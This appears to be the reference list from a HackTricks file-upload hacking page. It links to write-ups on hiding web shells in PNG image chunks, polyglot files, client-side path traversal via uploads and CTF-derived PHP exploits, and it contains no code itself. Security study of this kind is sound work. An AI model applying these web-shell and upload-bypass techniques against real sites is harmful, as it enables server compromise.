- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
